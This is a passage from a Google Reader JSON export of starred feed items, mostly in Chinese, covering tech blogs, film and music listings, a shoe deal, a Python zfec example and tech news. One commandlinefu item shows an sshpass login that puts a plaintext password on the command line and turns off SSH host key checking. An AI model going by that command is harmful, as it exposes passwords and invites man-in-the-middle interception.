<a href=\"http://coolshell.cn/articles/7490.html\">性能调优攻略</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2012年08月22日 -- <a href=\"http://coolshell.cn/articles/8138.html\">为什么我反对纯算法面试题</a></li><li>2012年09月07日 -- <a href=\"http://coolshell.cn/articles/8239.html\">无锁队列的实现</a></li></ul><div><a href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "onetwogoo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "crawlTimeMsec" : "1369855074577",
    "timestampUsec" : "1369855074577787",
    "id" : "tag:google.com,2005:reader/item/0cae41f36b5b167d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "[电影]悲惨世界",
    "published" : 1369793163,
    "updated" : 1369793163,
    "alternate" : [ {
      "href" : "http://www.verycd.com/entries/503983/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<img width=\"280\" src=\"http://i-7.vcimg.com/crop/ae8fb88f685619e2433c7d1eb3942584113624(280x)/thumb.jpg\" alt=\"悲惨世界海报\"><br>类型：剧情/歌舞<br>地区：美国<br>语言：英文<br>导演：汤姆·霍珀<br>编剧：威廉姆·尼克尔森 赫伯特·克莱茨莫 克劳德-米歇尔·勋伯格 阿兰·布伯里勒 维克多·雨果<br>演员：休·杰克曼/罗素·克劳/安妮·海瑟薇/阿曼达·塞弗里德/埃迪·雷德梅恩/海伦娜·邦汉·卡特/萨莎·拜伦·科恩/萨曼莎·巴克斯/艾伦·特维特/康姆·威尔金森/伊莎贝尔·艾伦<br>上映日期：2013年02月28日(中国)<br>IMDb号：1707386<br>简介：<br>       影片是著名音乐剧的电影版本，取材于雨果的原著小说。讲述了冉·阿让（休·杰克曼 饰）蹲了十九年大牢假释出狱，走投无路后被一位主教感化，决心从善，并改头换面过新生活。但命途多舛，多年后，负责追捕他的探长沙威（罗素·克劳 饰），执意要捉拿他归案 。冉·阿让不得不带着自己的养女，工厂女工芳汀（安妮·海瑟薇 饰）的女儿珂赛特四处逃亡。历经种种磨难，亲历了十九世纪法国社会历史变迁……\n\n       音乐剧《悲惨世界》1980年在巴黎体育馆首演，颇有影响，但由于制作不力等原因早早落幕。1985年，英国金牌戏剧制作人卡梅隆·麦金托什将Claude-Michel Schönberg和Alain Boublil两位法国主创请到伦敦，对该剧重新包装制作，精心打造舞美服装，增加曲目，并由Herbert Kretzmer创作英语歌词，将其搬上了伦敦西区的舞台，票房火爆，取得了前所未有的巨大成功。1987年该剧纽约剧组成立并进行首演，演出同样轰动了百老汇。\n\n       从1985首演到2012年，该剧先后在45个国家演出，并翻译制作了21种不同的语言版本，获得了多项艺术和戏剧奖项。 2002年，该剧首次来内地演出，在上海大剧院连演35场。《悲惨世界》已成为世界音乐剧史上的经典作品。动听的音乐和歌词深深打动着观众。目前，该剧是伦敦西区商业连演时间最长的音乐剧。在各地演出累计的票房压倒任何一部电影作品。<br><a title=\"在线观看\" href=\"http://www.verycd.com/playlinks/2931711/\">在线观看</a>"
    },
    "author" : "ewanqzz",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.verycd.com/base/movie/feed",
      "title" : "电影 - VeryCD电驴大全",
      "htmlUrl" : "http://www.verycd.com/base/movie/"
    }
  }, {
    "crawlTimeMsec" : "1369715075968",
    "timestampUsec" : "1369715075968872",
    "id" : "tag:google.com,2005:reader/item/ae0c7ff9d146f75c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "鞋帽衣物", "男士跑鞋", "耐克" ],
    "title" : "NIKE 耐克 LUNARSWIFT男子跑步鞋510787-013，339元包邮",
    "published" : 1369710023,
    "updated" : 1369710023,
    "alternate" : [ {
      "href" : "http://haitao.me/nike-nike-mens-running-shoes-510787-013339-yuan-lunarswift-shipping.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>这款Nike跑鞋，采用织物和网孔材质，专业时尚的鞋身，采用超轻量化坚固耐用的鞋面支撑技术，Lunarlon缓震系统提供轻质、超舒适的缓震效果和迅速的弹性反馈与支撑。</p>\n<p>国内优购网特价销售，339元包邮。运动和休闲穿着都很不错。</p>\n<p>购买地址：<a href=\"http://p.yiqifa.com/c?s=010fa869&amp;w=430577&amp;c=5820&amp;i=15862&amp;l=0&amp;e=c&amp;t=http://outlets.yougou.com/c-nike/sku-510787-99820398.shtml\">点击这里</a></p>\n<p><img alt=\"\" src=\"http://ww3.sinaimg.cn/bmiddle/766a95adjw1e53tvgzsxoj20dc0dcjs1.jpg\"></p>"
    },
    "author" : "haitao",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://haitao.me/feed/",
      "title" : "海淘迷 - haitao.me",
      "htmlUrl" : "http://haitao.me"
    }
  }, {
    "crawlTimeMsec" : "1369641009990",
    "timestampUsec" : "1369641009990987",
    "id" : "tag:google.com,2005:reader/item/4ee307bc3c91e737",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "Emmelie de Forest -《Only Teardrops》[MP3]",
    "published" : 1369639002,
    "updated" : 1369639002,
    "alternate" : [ {
      "href" : "http://www.verycd.com/topics/2954462/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<img src=\"http://i-7.vcimg.com/crop/3fe4f2f110d59a78a07ee2323015670044014(280x)/thumb.jpg\" alt=\"Emmelie de Forest -《Only Teardrops》[MP3]\" style=\"float:right;padding:0 0 10px 10px\">\n\t\t\t\t专辑英文名: Only Teardrops<br>歌手: Emmelie de Forest<br>音乐风格: 流行<br>资源格式: MP3<br>发行时间: 2013年5月6日<br>地区: 丹麦<br>语言: 英语<br>简介: <br>专辑比率:256kbps<br>专辑介绍:<br>2013欧洲首席新人首张大碟，2013欧洲乐坛最受期待天碟<br>2013欧洲电视歌唱大赛冠军初试啼声大作，精灵公主释放北欧优美音乐魔力大碟<br>丹麦国民甜心一展甜美韵味歌喉，最年轻欧视冠军，90后欧洲新晋明日之星震撼大作<br>2013欧洲最受期待新人，2013年欧洲电视歌唱大赛新科冠军Emmelie de Forest近日发行了她人生的首张专辑，专辑是在Emmelie de Forest代表丹麦参加2013欧洲电视歌唱大赛一周前发行；而随着Emmelie de Forest在本届比赛作为赛前夺冠呼声最高的选手，最后众望所归的拿下今年冠军，Emmelie de Forest的全新大碟也成为今年欧洲最期待和最受关注的大碟。目前2013欧歌赛夺冠单曲“Only Teardrops”已经在欧洲多国和澳洲和新西兰都获得冠军和前列的好名次，而这张处女大碟注定是今年欧洲第一天碟。<br>应该说，Emmelie De Forest首张专辑证明了她不愧是今年欧洲第一新人和第一新星，同时这张专辑也预示着她是丹麦音乐的全新代言人，这张专辑太优秀了，丹麦音乐人竭尽全力制作了一张独具北欧当地音乐风格的流行舞曲大碟。全新专辑主打独具北欧民谣风味的舞曲风格，北欧民谣元素是这张专辑很大的一个特征，但是专辑还是以北欧传统舞曲为基调，Trance，Dance等传统欧洲舞曲风格还是贯穿整张专辑。<br>和所有丹麦音乐一样，简单朴实，优美迷人，真挚纯洁是这张专辑给人最大的印象，不同于英国，南欧和美国流行乐复杂跳动的音符，最为简单自然的谱曲，最为真挚用情的词藻，给人带来的更是心灵的震撼和最为原始的音乐感动。Emmelie参与了专辑几乎所有歌曲的创作，这张专辑就是讲述了这个年仅20岁女生的成长的镇痛，表达了她对于生命的敬畏和对于爱情的诉求。<br>录制这张专辑年仅19岁的Emmelie de Forest在这张专辑就展现了高于同龄人的扎实演唱功底和良好的演唱技巧，Emmelie在这张专辑的表现实在是太出色了！所有歌曲都表现的完美无缺。同时嗓音醇厚清新的Emmelie在这张专辑展示了自己绝好的音色，难得在90后能找到如此优质的嗓音，确实非常难得！2013欧洲第一天碟，喜欢北欧音乐和丹麦音乐的歌迷不可错过。<br>歌手介绍：<br>Emmelie de Forest，丹麦女歌手，2013年欧洲电视歌唱大赛冠军，Emmelie de Forest今年的夺冠，是丹麦长达14年后再次夺得欧视冠军。1993年出生与丹麦Randers的Emmelie是至今为止欧洲电视歌唱大赛最年轻的冠军。据说她是英国维多利亚女皇第四代的子孙，Emmelie de Forest的皇室血统也是她最被人津津乐道的原因。<br>14岁就周游丹麦寻求各种演出机会，年仅20岁的Emmelie de Forest已经是在音乐圈打拼多年。经历多年的努力和沉淀，19岁被环球丹麦唱片签下录制了这张大碟；2013年2月，Emmelie de Forest以完全新人背景参加2013年丹麦歌谣大赏，同时也是丹麦欧洲电视歌唱大赛预选赛，当时本来没有抱太大期望，因为谁也不认识这个年轻的女新人，谁知道首场演出就引发丹麦全国轰动，参赛曲“Only Teardrops”立马成为丹麦最受欢迎的单曲，之后过五关斩六将，然后在丹麦歌谣大赏决赛毫无悬念夺冠。<br>同时Emmelie de Forest在丹麦歌谣大赏决赛的“Only Teardrops”的现场立马风靡传遍整个欧洲，在2013年欧洲电视歌唱大赛开赛前就是夺冠呼声最高的歌手；但是不同于2012瑞典的loreen一技绝尘的形式，今年她要面对乌克兰，挪威，希腊等实力彪悍的对手的强大挑战，在2013年5月18日晚，与丹麦首都哥本哈根仅仅一桥之隔的马尔默，进行了欧洲年度最大盛世——欧视决赛；最后Emmelie de Forest不负众望，以281分总分，仅仅只领先第二名不到50分的微弱优势，为丹麦夺下长达14年的欧视冠军，成为2013欧洲首席新星！同时也为丹麦夺下2014年欧洲电视歌唱大赛举办权。<br>夺冠当晚，年仅500万人口的丹麦举国欢腾，欣喜若狂，很多丹麦人都不敢相信这个事实，确实能在当今欧洲电视歌唱大赛夺冠，对于丹麦这样的小国确实难度太大和一个不敢想象的事实。要知道，早几年丹麦甚至连决赛都挤不进，更别提夺冠了。Emmelie de Forest夺冠后，立马成为成为丹麦国民英雄，回国受到国王接见。而借助这次冠军的强大影响力，Emmelie de Forest不但要宣传新专辑，而且要帮助丹麦筹备2014欧视，今年注定Emmelie de Forest是非常忙碌的一年。<br>超凡脱俗的美貌，清新迷人，犹如公主般高贵的气质，Emmelie de Forest毫无争议已经成为当今丹麦最成功的形象代言人，“丹麦公主”，“精灵公主”，“丹麦甜心”等全新的称号，已经全部冠在了这个20岁女孩的头上；Emmelie de Forest已经继网球前世界第一沃兹尼亚奇之后，成为丹麦在世界范围最响亮的名片。似乎这个盛产童话的北欧国度，同时也盛产像沃兹尼亚奇，Emmelie这样公主气质俱佳的绝世美女。虽然今年欧洲电视歌唱大赛，Emmelie de Forest不是唱功最好的那位，也不是发挥最好的那位，但是高贵迷人的气质，优雅自如的台风，得体周到的言辞，以及本届本届比赛最小参赛年来之一，年轻有为的优势，使得她是本届比赛最受观众喜爱和评委提携的歌手。夺冠后的Emmelie de Forest注定今后的音乐生涯会有更大的舞台和发展空间，希望这个热爱歌唱的女孩在今后能有更加优异的表现和更大的突破吧。<br>“Only Teardrops” 欧视决赛现场<br>“Only Teardrops” 丹麦歌谣大赛现场（很明显这个发挥更好）<br>专辑试听：“What Are You Waiting For&quot;<br>“Force Of Nature&quot;<br>“Beat the Speed of Sound&quot;<br>专辑曲目: <br>        1.\tTeardrops Overture \t \t0:47<br>2.\tHunter &amp; Prey \t\t3:29<br>3.\tChange\t3:59<br>4.\tOnly Teardrops\t3:02<br>5.\tWhat Are You Waiting For\t3:36<br>6.\tHaunted Heart\t3:35<br>7.\tForce of Nature \t3:43<br>8.\tBeat the Speed of Sound\t3:50<br>9.\tSoldier of Love\t3:25<br>10.\tRunning In My Sleep\t3:38<br>11.\tLet It Fall \t3:49<br>12.\tOnly Teardrops (Symphonic version)\t\t3:18        <br><a href=\"http://www.verycd.com/topics/2954462/#theCom\">评论(37) </a>  <a href=\"http://www.verycd.com/topics/2954462/\">收藏(6) </a>  <a href=\"http://www.verycd.com/topics/2954462/\">查看完整资源页</a><br>"
    },
    "author" : "alliangzhang",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.verycd.com/sto/music/feed",
      "title" : "首页 音乐  VeryCD电驴大全 - 电驴资源订阅",
      "htmlUrl" : "http://www.verycd.com/sto/music/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1369416156727",
    "timestampUsec" : "1369416156727969",
    "id" : "tag:google.com,2005:reader/item/4e76bd3637639b71",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "SSH Auto-login with password",
    "published" : 1369406018,
    "updated" : 1369406018,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12366/ssh-auto-login-with-password"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/kgOn16S0e4c/ssh-auto-login-with-password",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ sshpass -p &quot;YOUR_PASSWORD&quot; ssh -o StrictHostKeyChecking=no YOUR_USERNAME@SOME_SITE.COM</code>\n<div><p>You need to install \"sshpass\" for this to work.</p>\n<p>apt-get install sshpass</p></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12366/ssh-auto-login-with-password\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/o0110o\">View all commands by <strong>o0110o</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/kgOn16S0e4c\" height=\"1\" width=\"1\">"
    },
    "author" : "o0110o (http://androidista.com)",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1369127111827",
    "timestampUsec" : "1369127111827124",
    "id" : "tag:google.com,2005:reader/item/7538c78ab77eaecf",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "python fec parity" ],
    "title" : "Python zfec howto/example",
    "published" : 1369120020,
    "updated" : 1369120020,
    "alternate" : [ {
      "href" : "http://blog.est.im/post/50975299198",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>To install</p>\n\n<pre><code>$ pip install zfec\n</code></pre>\n\n<p>Suppose I have two blocks of data and want a third block as redundancy</p>\n\n<pre><code>&gt;&gt;&gt; zfec.Encoder(2, 3).encode([&#39;ab&#39;, &#39;cd&#39;])\n[&#39;ab&#39;, &#39;cd&#39;, &#39;en&#39;]\n&gt;&gt;&gt; zfec.Decoder(2, 3).decode([&#39;ab&#39;, &#39;cd&#39;, ], [0, 1])\n[&#39;ab&#39;, &#39;cd&#39;]\n# somehow lost the second block, use the third block the recover\n&gt;&gt;&gt; zfec.Decoder(2, 3).decode([&#39;ab&#39;, &#39;en&#39;, ], [0, 2])\n[&#39;ab&#39;, &#39;cd&#39;]\n</code></pre>\n\n<p>In the above example, k=2 and m=3</p>\n\n<p>ref: <a href=\"https://pypi.python.org/pypi/zfec\">https://pypi.python.org/pypi/zfec</a></p>\n\n<p>btw <a href=\"http://en.wikipedia.org/wiki/Secret_sharing#Trivial_secret_sharing\">Trivial secret sharing</a></p>\n\n<pre><code>secret = 123\na, b, c = [int((random.random() * 256)) for x in range(3)]\nd = map(xor, [secret, a, b, c])\n</code></pre>\n\n<p>so 4 players has each a share of secret.</p>\n\n<p>This is kinda lame… Shamir’s scheme is much better</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/initiative",
      "title" : "est&#39;s blog",
      "htmlUrl" : "http://blog.est.im/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1368802882622",
    "timestampUsec" : "1368802882622271",
    "id" : "tag:google.com,2005:reader/item/a253b9dd19abc598",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "3D成像，也可以有简单便宜的方法了！",
    "published" : 1368727221,
    "updated" : 1368769041,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/437028/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p>我们的视网膜、普通的相机所捕捉的都是二维图像，如果捕捉一个物体的三维（3D）立体画面就需要做进一步的处理。尽管现在已经有不少可做到这一点的技术（比如全息成像技术、运动捕捉技术等等），但它们的成本往往很高，而且需要大量的镜头和激光发射装置等昂贵的光学元件。另外，这些技术可能只适用于特定波段的光，这也限制了它们的使用。而现在，科学家们已经研发出了一种更加简单和廉价的创建3D图像的方法。</p>\n\n<p>来自英国格拉斯哥大学的孙宝清及其同事研发出了一种无需镜头和复杂设备便可重建物体3D图像的的方法。通过给一个3D物体（此例中是一个人头模型）进行照明，并用一种被称为“单像素检测器”的微小光检测器从不同的角度检测被照明的场景，研究人员收集到了反射光数据。然后，他们对这些反射光数据来进行加权，将从不同角度产生的所有这些加权数据进行叠加，就可以得到一幅该3D物体的准确重建图像，我们可以从下面这个视频中了解一下这种3D成像方法的具体步骤。</p>\n\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://player.youku.com/player.php/sid/XNTU3NzM3NjA4/v.swf&amp;width=555&amp;height=454\" width=\"555\" height=\"454\"></iframe></p>\n\n<p>视频提供：Optics Group, University of Glasgow.</p>\n\n<h2>什么是“单像素检测器”</h2>\n\n<p>在这一方法中，“单像素检测器”这个装置扮演了至关重要的角色。那么什么是“单像素检测器”呢？研究人员马修·埃德加（Matthew Edgar）告诉果壳网，“单像素检测器”是一个非常简单的光电二极管，只由一个光敏元件组成，其安装与配置十分简单。与现在各类摄像设备都有几百上千万像素不同，这种检测器只有一个像素。他们会用光投影仪以不同的光照方式对待成像物体进行照明，然后用一个单像素检测器测算整体反射光的数据，在对一系列反馈信号数据进行计算之后，他们就得到了一副物体的2D图像，这幅图像中包含该光照模式对应的阴影和明暗信息。因此，从理论上来说，他们只需要两个单像素检测器得到的2D图像就可以绘制物体的3D图像，不过为了使计算更简便，研究人员使用了四个单像素检测器来完成这一工作。而这一3D成像系统的精度则取决于光照的方式，对物体的光照越精细，反射光与环境光就更容易区分，所得图像的信噪比也就越大。</p>\n\n<h2>新方法的优势</h2>\n\n<p>埃德加告诉果壳网，相比那些传统的3D成像方法，这种新方法的优点有以下几个：</p>\n\n<ul><li>设备简单，不需要镜头和复杂的设备，而且能够处理那些现有光学元件无法检测到的光波段。</li>\n\t<li>大大降低了成本。</li>\n\t<li>传统的3D成像方法都是从不同角度拍摄物体的2D图像，然后通过合成来得到3D图像，这对图像匹配计算的要求就非常高，因为计算机需要识别出两幅不同的图像中物体的哪些部位是对应的。而他们所用的新方法中，所得的物体图像在空间上是一致的，只在阴影和明暗上有区别，因此大大降低了计算量。</li>\n</ul><h2>广阔的应用前景</h2>\n\n<p>研究人员对这种新成像方法的应用前景也非常看好。未来，利用单像素检测器的全波段检测性能，医生可以用这种方法进行医疗诊断，生成肿瘤和其它皮下病灶的3D图像，方便治疗。在工业领域，人们也可以用它进行瓦斯或是其它化学物品泄露的检测。对于普通消费者来说，利用这套系统对现有的相机进行改造，调整相机的闪光模式，我们就可以把2D相机变成3D相机，而且成本低廉，每个人都能买得起。</p>\n\n<p>现阶段，研究人员已经开始对这套系统进行室外应用和更多波段的应用测试。因为目前红外成像仪之类的不可见光成像设备的价格非常高昂，他们也希望能够将这种方法应用在可见光以外的电磁波谱中。</p>\n\n<p><strong><span style=\"color:rgb(75,167,51)\">相关的果壳网小组</span></strong></p>\n\n<ul style=\"font-size:14.399999618530273px;margin:0px;font-family:Arial,Helvetica,sans-serif;line-height:22.399999618530273px\"><li><a href=\"http://www.guokr.com/group/79/\" style=\"color:rgb(0,120,182);text-decoration:initial;font-size:12px;line-height:14.399999618530273px\">数码控</a></li>\n\t<li><a href=\"http://www.guokr.com/group/264/\" style=\"color:rgb(0,120,182);text-decoration:initial;font-size:12px;line-height:14.399999618530273px\">眼与视觉</a></li>\n\t<li><a href=\"http://www.guokr.com/group/38/\" style=\"color:rgb(0,120,182);text-decoration:initial;font-size:12px;line-height:14.399999618530273px\">创意科技</a></li>\n</ul><p><span style=\"font-size:10px\"><b>信息来源</b>：EurekAlert！</span><br><strong style=\"font-size:10px\">文章题图：<a href=\"http://shutterlock.com\">shutterlock</a></strong><a href=\"http://shutterlock.com\" style=\"font-size:10px\">​</a></p></div><img src=\"http://analytics.guokr.com/ga.gif?utmp=/article/437028/&amp;utmac=UA-19521615-11&amp;cookie_name=utmrss&amp;guid=on&amp;utmn=2523374539\">"
    },
    "author" : "小行踪",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1368498714697",
    "timestampUsec" : "1368498714697906",
    "id" : "tag:google.com,2005:reader/item/c26c7ff169e5e5cc",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Google / 谷歌" ],
    "title" : "施密特：“永不作恶”是有史以来最愚蠢的规则",
    "published" : 1368496229,
    "updated" : 1368496229,
    "alternate" : [ {
      "href" : "http://www.cnbeta.com/articles/237209.htm",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "前谷歌CEO、现谷歌主席施密特于近日出现在NPR的每周喜剧秀<i>Wait Wait… Don’t Tell Me! </i>节目中。施密特此行最重要的任务当然是推荐自己的新书。不过，他也毫不吝啬地跟主持人分享了一些谷歌公司的趣事。<b>在谈及谷歌公司的“永不作恶”口号时，施密特直言不讳地指出，“那就是史上最愚蠢的一条规则”。</b><img width=\"1\" height=\"1\" src=\"http://cnbeta.feedsportal.com/c/34306/f/624776/s/2bdfb0ca/mf.gif\" border=\"0\"><div><table border=\"0\"><tr><td valign=\"middle\"><a href=\"http://share.feedsportal.com/share/twitter/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F237209.htm&amp;t=%E6%96%BD%E5%AF%86%E7%89%B9%EF%BC%9A%E2%80%9C%E6%B0%B8%E4%B8%8D%E4%BD%9C%E6%81%B6%E2%80%9D%E6%98%AF%E6%9C%89%E5%8F%B2%E4%BB%A5%E6%9D%A5%E6%9C%80%E6%84%9A%E8%A0%A2%E7%9A%84%E8%A7%84%E5%88%99\"><img src=\"http://res3.feedsportal.com/social/twitter.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/facebook/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F237209.htm&amp;t=%E6%96%BD%E5%AF%86%E7%89%B9%EF%BC%9A%E2%80%9C%E6%B0%B8%E4%B8%8D%E4%BD%9C%E6%81%B6%E2%80%9D%E6%98%AF%E6%9C%89%E5%8F%B2%E4%BB%A5%E6%9D%A5%E6%9C%80%E6%84%9A%E8%A0%A2%E7%9A%84%E8%A7%84%E5%88%99\"><img src=\"http://res3.feedsportal.com/social/facebook.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/linkedin/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F237209.htm&amp;t=%E6%96%BD%E5%AF%86%E7%89%B9%EF%BC%9A%E2%80%9C%E6%B0%B8%E4%B8%8D%E4%BD%9C%E6%81%B6%E2%80%9D%E6%98%AF%E6%9C%89%E5%8F%B2%E4%BB%A5%E6%9D%A5%E6%9C%80%E6%84%9A%E8%A0%A2%E7%9A%84%E8%A7%84%E5%88%99\"><img src=\"http://res3.feedsportal.com/social/linkedin.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/gplus/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F237209.htm&amp;t=%E6%96%BD%E5%AF%86%E7%89%B9%EF%BC%9A%E2%80%9C%E6%B0%B8%E4%B8%8D%E4%BD%9C%E6%81%B6%E2%80%9D%E6%98%AF%E6%9C%89%E5%8F%B2%E4%BB%A5%E6%9D%A5%E6%9C%80%E6%84%9A%E8%A0%A2%E7%9A%84%E8%A7%84%E5%88%99\"><img src=\"http://res3.feedsportal.com/social/googleplus.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/email/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F237209.htm&amp;t=%E6%96%BD%E5%AF%86%E7%89%B9%EF%BC%9A%E2%80%9C%E6%B0%B8%E4%B8%8D%E4%BD%9C%E6%81%B6%E2%80%9D%E6%98%AF%E6%9C%89%E5%8F%B2%E4%BB%A5%E6%9D%A5%E6%9C%80%E6%84%9A%E8%A0%A2%E7%9A%84%E8%A7%84%E5%88%99\"><img src=\"http://res3.feedsportal.com/social/email.png\" border=\"0\"></a></td><td valign=\"middle\"></td></tr></table></div><br><br><a href=\"http://da.feedsportal.com/r/165664435403/u/31/f/624776/c/34306/s/2bdfb0ca/a2.htm\"><img src=\"http://da.feedsportal.com/r/165664435403/u/31/f/624776/c/34306/s/2bdfb0ca/a2.img\" border=\"0\"></a><img width=\"1\" height=\"1\" src=\"http://pi.feedsportal.com/r/165664435403/u/31/f/624776/c/34306/s/2bdfb0ca/a2t.img\" border=\"0\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cnbeta.com/backend.php",
      "title" : "cnBeta.COM业界资讯",
      "htmlUrl" : "http://www.cnbeta.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1368294123742",
    "timestampUsec" : "1368294123742158",
    "id" : "tag:google.com,2005:reader/item/b916a51704caa5ca",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "微软到底出了什么问题",
    "published" : 1368251520,
    "updated" : 1368251520,
    "alternate" : [ {
      "href" : "http://blog.est.im/post/50147253283",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>最近HN上有个<a href=\"https://news.ycombinator.com/item?id=5688151\">关于Linux 3.1内核tickless新特性</a>的讨论，然后一位微软员工，自称来自NT内核组，发个帖子抱怨微软：</p>\n\n<blockquote>\n  <p>See, component owners are generally openly hostile to outside patches: if you’re a dev, accepting an outside patch makes your <strong>lead</strong> angry (due to the need to maintain this patch and to justify in in shiproom the unplanned design change), makes <strong>test</strong> angry (because test is on the hook for making sure the change doesn’t break anything, and you just made work for them), and <strong>PM</strong> is angry (due to the schedule implications of code churn). There’s just no incentive to accept changes from outside your own team. You can always find a reason to say “no”, and you have very little incentive to say “yes”.</p>\n  \n  <p>Another reason for the quality gap is that that we’ve been having trouble keeping talented people. Google and other large Seattle-area companies keep poaching our best, most experienced developers,</p>\n  \n  <p>More examples:<br>\n  - We can’t touch named pipes. Let’s add %INTERNAL_NOTIFICATION_SYSTEM%! (Oh, and let’s make %INTERNAL_NOTIFICATION_SYSTEM% inconsistent with virtually every other named NT primitive.)<br>\n  - We can’t expose %INTERNAL_NOTIFICATION_SYSTEM% to the rest of the world because we don’t want to fill out paperwork and we’re not losing sales because we only have 1990s-era Win32 APIs available publicly.<br>\n  - We can’t touch DCOM. Let’s create %C#_REMOTING_FLAVOR_OF_THE_WEEK%!<br>\n  - XNA. Need I say more?<br>\n  - Why would anyone need an archive format that supports files larger than 2GB?<br>\n  - Let’s support symbolic links (Can I have a one on my review score now?), but make sure that nobody can use them so I don’t get blamed for security vulnerabilities (Great! I got that one on my review score, and now I get to look sage and responsible!)<br>\n  - We can’t touch Source Depot, so let’s hack together SDX!<br>\n  - We can’t touch SDX, so let’s pretend for four releases that we’re moving to TFS while not actually changing anything!<br>\n  - Oh god, the NTFS code is a purple opium-fueled Victorian horror novel that uses global recursive locks and SEH for flow control. Let’s write ReFs instead. (And hey, let’s start by copying and pasting the NTFS source code and removing half the features! Then let’s add checksums, because checksums are cool, right, and now with checksums we’re just as good as ZFS? Right? Do I get a one on my review score now? And who the hell needs quotas anyway?)<br>\n  - We just can’t be fucked to implement C11 support, and variadic templates were just too hard to implement in a year. (But ohmygosh I turned “^” into a reference-counted pointer operator. Can I have my patent cube and one on my review score now? Oh, and what’s a reference cycle?)</p>\n</blockquote>\n\n<p>简单的说，就是NT内核</p>\n\n<ol><li>改进都被臃肿的官僚枪毙了。<br>\n2  牛人都去Google了</li>\n<li>做内核的都是现招应届毕业生。造轮子NIH综合症高发群体   </li>\n</ol><p>在大学的时候也接触过微软技术体系，感觉是有牛逼的地方，有亮点，但是偶数代会把奇数代的技术否定掉。记得有个哥们花了很大力气学习翻译了.NET Atlas AJAX，结果beta一完毕，整个AJAX体系就变得面目全非了。</p>\n\n<p>微软的内部已经死掉了。Wintel 没有希望了。PC也将继续没落。</p>\n\n<p>btw 想起了<a href=\"http://www.36kr.com/p/31377.html\">一幅图</a></p>\n\n<p><img src=\"http://static.36kr.com/wp-content/uploads/2011/06/73fa01aftw1dinkcskk2nj.png\" alt=\"\"></p>"
    },
